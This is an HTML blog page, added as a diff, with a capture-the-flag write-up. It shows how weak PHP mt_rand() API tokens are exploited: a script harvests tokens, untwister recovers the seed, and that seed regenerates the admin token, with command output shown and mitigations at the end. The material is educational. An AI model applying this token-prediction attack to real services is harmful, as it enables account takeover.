@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="This challenge aims to highlight the weaknesses of PRNG (Pseudorandom Number Generator) algorithms. Tl;Dr: The app use Pseudorandom Number Generator to generate API access token, retrieving a lot of t">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Misc CTF - PRNG Weakness">
+<meta property="og:url" content="https://hg8.sh/posts/misc-ctf/PRNG%20Weakness/index.html">
+<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
+<meta property="og:description" content="This challenge aims to highlight the weaknesses of PRNG (Pseudorandom Number Generator) algorithms. Tl;Dr: The app use Pseudorandom Number Generator to generate API access token, retrieving a lot of t">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/76225736-39b5a280-621d-11ea-9544-cb656817dea6.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/76226109-b183cd00-621d-11ea-8f23-6f8912234297.png">
+<meta property="article:published_time" content="2021-09-15T22:00:00.000Z">
+<meta property="article:modified_time" content="2022-01-22T21:34:50.901Z">
+<meta property="article:author" content="hg8">
+<meta property="article:tag" content="linux">
+<meta property="article:tag" content="beginner">
+<meta property="article:tag" content="prng">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/76225736-39b5a280-621d-11ea-9544-cb656817dea6.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+     
+    <title>Misc CTF - PRNG Weakness :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+    
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="hg8's Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/posts/misc-ctf/xxe-to-ssrf/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/posts/misc-ctf/xss-to-csrf/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+    </span>
+    <br/>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Random-Number-Generator"><span class="toc-number">2.</span> <span class="toc-text">Random Number Generator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Abusing-the-API-token-generation"><span class="toc-number">3.</span> <span class="toc-text">Abusing the API token generation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mitigations"><span class="toc-number">4.</span> <span class="toc-text">Mitigations</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">5.</span> <span class="toc-text">Reference</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Real-Life-example"><span class="toc-number">6.</span> <span class="toc-text">Real Life example</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        <header id="header">
+  <a href="/">
+  
+      <div id="logo" style="background-image: url(/images/logo.webp);"></div>
+  
+    <span class="logo__mark"></span>
+    <span class="logo__text">./hg8.sh</span>
+    <span class="logo__cursor"></span>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
+      </li>
+       
+        <li><a href="/">Home</a></li>
+       
+        <li><a href="/about/">About</a></li>
+       
+        <li><a href="/archives/">Posts</a></li>
+       
+        <li><a href="/search/">Search</a></li>
+      
+    </ul>
+  </div>
+</header>
+
+        
+          <br>
+          <br>
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Misc CTF - PRNG Weakness
+    </h1>
+
+
+
+    <div class="meta"> 
+      
+    <div class="postdate">
+      
+        <time datetime="2021-09-15T22:00:00.000Z" itemprop="datePublished">16-09-2021</time>
+        
+      
+    </div>
+
+
+      — Written by 
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">hg8</span>
+      </span>
+      —
+      5 min read
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>This challenge aims to highlight the weaknesses of PRNG (Pseudorandom Number Generator) algorithms.</p>
+<p><strong>Tl;Dr:</strong> The app use Pseudorandom Number Generator to generate API access token, retrieving a lot of tokens allows a brute force attack to recover the initial PRNG seed. Using this seed it was possible to find the first token generated which belongs to the <code>admin</code> user and retrieve the flag using its account.</p>
+<p>Alright! Let’s get into the details now!</p>
+<hr>
+<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>Opening the challenge display the following website:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/76225736-39b5a280-621d-11ea-9544-cb656817dea6.png" alt="Quotes API"></p>
+<p>Entering a username gives us an access token for the “Quotes API”:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/76226109-b183cd00-621d-11ea-8f23-6f8912234297.png" alt="Quotes API token"></p>
+<p>Let’s try it:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">&quot;http://ctf.one:36089/quote.php?token=1952540257&quot;</span></span><br><span class="line">Sur le plus haut trône du monde, on est jamais assis que sur son boule. </span><br><span class="line">~Booba</span><br><span class="line"></span><br><span class="line">$ curl <span class="string">&quot;http://ctf.one:36089/quote.php?token=1952540257&quot;</span></span><br><span class="line">Ne jamais remettre à demain ce qu’on peut faire à une main. </span><br><span class="line">~La fouine</span><br></pre></td></tr></table></figure>
+
+<p>The application is quite simple since there is no other endpoints at all. We can quickly notice with the file extension <code>.php</code> that the app is running PHP, this informations will probably comes useful later.</p>
+<p>The <code>quotes.php</code> endpoint doesn’t look interesting from here, it returns a random quote if the token is valid but nothing else interesting.</p>
+<h2 id="Random-Number-Generator"><a href="#Random-Number-Generator" class="headerlink" title="Random Number Generator"></a>Random Number Generator</h2><p>So far here are the informations we can gather to progress:</p>
+<ul>
+<li>app is running PHP</li>
+<li>token is always 10 chars long</li>
+<li>length of the <code>username</code> doesn’t impact the length of the token.</li>
+<li>token is always an integer</li>
+<li>token looks fully random and not increment</li>
+</ul>
+<p>Next logical step is to check PHP documentation for built-in random generation library:</p>
+<p>The first function we stumble across is <code>[rand()](https://www.php.net/manual/en/function.rand.php)</code>.</p>
+<blockquote>
+<p><strong>Rand</strong><br>Generate a random integer<br><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.rand.php">https://www.php.net/manual/en/function.rand.php</a></p>
+</blockquote>
+<p>If we follow the documentation this would mean the quote API is using the following code to generate a 10 long integer token:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="keyword">echo</span> rand(<span class="number">1000000000</span>, <span class="number">9999999999</span>);</span><br><span class="line"><span class="number">3771020782</span></span><br></pre></td></tr></table></figure>
+
+<p>Doesn’t seems like a logical nor practical way to me. Let’s see if other functions exist.</p>
+<p>The <code>[rand()](https://www.php.net/manual/en/function.rand.php)</code> php documentation also link to the <code>[mt_rand()](https://www.php.net/manual/en/function.mt-rand.php)</code> function:</p>
+<blockquote>
+<p><strong>mt_rand</strong><br>Generate a random value via the Mersenne Twister Random Number Generator<br><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.mt-rand.php">https://www.php.net/manual/en/function.mt-rand.php</a></p>
+</blockquote>
+<p>Again, let’s give it a try:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">php &gt; mt_srand(<span class="number">92735103</span>); <span class="comment">//random seed</span></span><br><span class="line">php &gt; <span class="keyword">echo</span> mt_rand();</span><br><span class="line"><span class="number">1711350997</span></span><br><span class="line">php &gt; <span class="keyword">echo</span> mt_rand();</span><br><span class="line"><span class="number">1026457933</span></span><br><span class="line">php &gt; <span class="keyword">echo</span> mt_rand();</span><br><span class="line"><span class="number">2036211242</span></span><br></pre></td></tr></table></figure>
+
+<p>That’s interesting! Without any extra parameters the returned value of <code>mt_rand()</code> is the exact same format of our tokens.</p>
+<p>Ok, we now know that this Quotes API is using <code>mt_rand()</code> to generate a random token.<br>Now what?</p>
+<p>While checking the PHP documentation of <code>mt_rand()</code> we stumble across this warning:</p>
+<blockquote>
+<p><strong>Caution!</strong><br>This function does not generate cryptographically secure values, and should not be used for cryptographic purposes.</p>
+</blockquote>
+<p>What does this mean ?</p>
+<p>Wikipedia gives us a little insight of how PRNG works:</p>
+<blockquote>
+<p>A pseudorandom number generator (PRNG), also known as a deterministic random bit generator, is an algorithm for generating a sequence of numbers whose properties approximate the properties of sequences of random numbers. The PRNG-generated sequence is not truly random, because it is completely determined by an initial value, called the PRNG’s seed.<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Pseudorandom_number_generator">https://en.wikipedia.org/wiki/Pseudorandom_number_generator</a></p>
+</blockquote>
+<p>If you are unfamiliar with PRNG here are the key points you have to remember:</p>
+<ol>
+<li><p>All PRNG algorithms take an input called seed as starting point. This seed is the base number on which an algorithmic formula is applied.</p>
+</li>
+<li><p>Then the formula is applied on this initial seed and the result generated is a random-looking number.</p>
+</li>
+<li><p>The previously generated number is used as the seed for the next random number generation.</p>
+</li>
+</ol>
+<p>Check out the C standard library implementation of <code>rand</code> to give you a better idea on how it’s really done under the hood:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> next = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rand</span><span class="params">(<span class="keyword">void</span>)</span> <span class="comment">// RAND_MAX assumed to be 32767</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    next = next * <span class="number">1103515245</span> + <span class="number">12345</span>;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(next/<span class="number">65536</span>) % <span class="number">32768</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">srand</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> seed)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    next = seed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>With all this knowledge we can start to see where the issue is and how we could potentially exploit it right ?</p>
+<h2 id="Abusing-the-API-token-generation"><a href="#Abusing-the-API-token-generation" class="headerlink" title="Abusing the API token generation"></a>Abusing the API token generation</h2><p>Let’s try to imagine how the token generation code in this <code>Quote API</code> works. Here is one theory:</p>
+<ol>
+<li>The php <code>mt_rand()</code> function gets initialized with an hard-coded seed using <code>mt_srand()</code>.</li>
+<li>Tokens get generated with <code>mt_rand()</code> and saved to a database.</li>
+<li>Admin generate the first token for himself and get stored in the database.</li>
+<li>As new users login, new pseudo-random tokens get generated and saved to the database.</li>
+</ol>
+<p>If this workflow is correct we could maybe use the weakness of PRNG algorithm to recover the initial seed and, thanks to the initial seed, we could generate the first few token generated by the app with should correspond to the admin account token, giving us privileged access to the API.</p>
+<p>Enough with the theory, let’s get to the point with practice!</p>
+<p>First we will need to generate a large amount of tokens to make the seed bruteforce work as easy and quick as possible.</p>
+<p>Let’s write a small Python script to extract large amount of tokens from the <code>Quote API</code>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">port = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1000</span>):</span><br><span class="line">    r = requests.post(f <span class="string">&quot;http://ctf.one:&#123;port&#125;/&quot;</span>,</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: randrange(<span class="number">1000000000</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">m = re.search(r <span class="string">&quot;(?&lt;==)(.*?)(?=&lt;)&quot;</span>, r.text)</span><br><span class="line">token = <span class="built_in">int</span>(m.group())</span><br><span class="line"><span class="built_in">print</span>(f <span class="string">&quot;&#123;token&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>Running the script will output the following list of tokens:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$ python quotes-tmp.py 36089</span><br><span class="line">1061286297</span><br><span class="line">1036863270</span><br><span class="line">989299637</span><br><span class="line">1500097896</span><br><span class="line">488092417</span><br><span class="line">503588414</span><br><span class="line">1978821885</span><br><span class="line">1395782229</span><br><span class="line">659952241</span><br><span class="line">1446891396</span><br><span class="line">40888864</span><br><span class="line">1913918556</span><br><span class="line">1410184624</span><br><span class="line">320904415</span><br><span class="line">136773179</span><br><span class="line">1161884405</span><br><span class="line">143558795</span><br><span class="line">2064003864</span><br><span class="line">1583125591</span><br><span class="line">1076847175</span><br><span class="line">485321260</span><br><span class="line">1299391838</span><br><span class="line">482138034</span><br><span class="line">1401969874</span><br><span class="line">1203600045</span><br><span class="line">19994765</span><br><span class="line">1009433858</span><br><span class="line">1347240952</span><br><span class="line">1551734364</span><br><span class="line">1411729604</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>Let’s now feed this list of tokens to a PRNG seed recovering tool like <code>[untwister](https://github.com/altf4/untwister)</code>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./untwister -i quotes-tokens.txt -r php-mt_rand -S 1000000</span><br><span class="line">[!] Not enough observed values to perform state inference.</span><br><span class="line">[*] Looking <span class="keyword">for</span> seed using php-mt_rand</span><br><span class="line">[*] Spawning 2 worker thread(s) ...</span><br><span class="line">[*] Completed <span class="keyword">in</span> 0 second(s)</span><br><span class="line">[$] Found seed 626545 with a confidence of 100.00%</span><br></pre></td></tr></table></figure>
+
+<p>Alright! Sound good, we now have the initial seed: <code>626545</code>.</p>
+<p>Following our scenario we should now be able to get the few first tokens generated by the app, which will hopefully be the token used by the admin. </p>
+<p>Let’s give it a try:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ php56 -a</span><br><span class="line">Interactive shell</span><br><span class="line"></span><br><span class="line">php &gt; mt_srand(<span class="number">626545</span>);</span><br><span class="line">php &gt; <span class="keyword">echo</span> mt_rand();</span><br><span class="line"><span class="number">531921107</span></span><br><span class="line">php &gt;</span><br></pre></td></tr></table></figure>
+
+<p>We have a first token, let’s try to use it to see if the API return a different output:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">&quot;ctf.one:36089/quote.php?token=531921107&quot;</span></span><br><span class="line">FLAG&#123;rn6 mu57 n07 b3 pr3d1c74bl3!&#125;%</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h2><p>Use <strong>CSPRNG</strong> for any random that need to be truly random and secure:</p>
+<ul>
+<li>Password reset tokens</li>
+<li>CSRF tokens</li>
+<li>Session identifiers</li>
+<li>Cryptographic primitives</li>
+<li>Secret/unpredictable value generation</li>
+<li>…</li>
+</ul>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cryptographic_Storage_Cheat_Sheet.md#secure-random-number-generation">CheatSheets: Secure Random Number Generation | OWASP</a></li>
+<li><a target="_blank" rel="noopener" href="https://insomniasec.com/cdn-assets/Not_So_Random_-_Exploiting_Unsafe_Random_Number_Generator_Use.pdf">Not So Random Exploiting Unsafe Random Number Generator Use</a></li>
+</ul>
+<h2 id="Real-Life-example"><a href="#Real-Life-example" class="headerlink" title="Real Life example"></a>Real Life example</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://hackerone.com/reports/576504">Authentication Bypass by abusing Insecure crypto tokens - HackerOne</a></li>
+<li><a target="_blank" rel="noopener" href="https://media.blackhat.com/bh-us-12/Briefings/Argyros/BH_US_12_Argyros_PRNG_WP.pdf">Predictability of password reset tokens | Black Hat</a></li>
+</ul>
+<hr>
+<p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p>
+<p>See you next time ;)</p>
+<p>-hg8</p>
+
+  </div>
+</article>
+<br>
+<br>
+
+
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/Misc/">Misc</a>
+    </div>
+
+
+
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/beginner/" rel="tag">beginner</a>, <a class="tag-link-link" href="/tags/linux/" rel="tag">linux</a>, <a class="tag-link-link" href="/tags/prng/" rel="tag">prng</a>
+    </div>
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Random-Number-Generator"><span class="toc-number">2.</span> <span class="toc-text">Random Number Generator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Abusing-the-API-token-generation"><span class="toc-number">3.</span> <span class="toc-text">Abusing the API token generation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mitigations"><span class="toc-number">4.</span> <span class="toc-text">Mitigations</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">5.</span> <span class="toc-text">Reference</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Real-Life-example"><span class="toc-number">6.</span> <span class="toc-text">Real Life example</span></a></li></ol>
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022
+    <a href="https://hg8.sh">hg8.sh</a>
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+    
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+
+
+</body>
+</html>
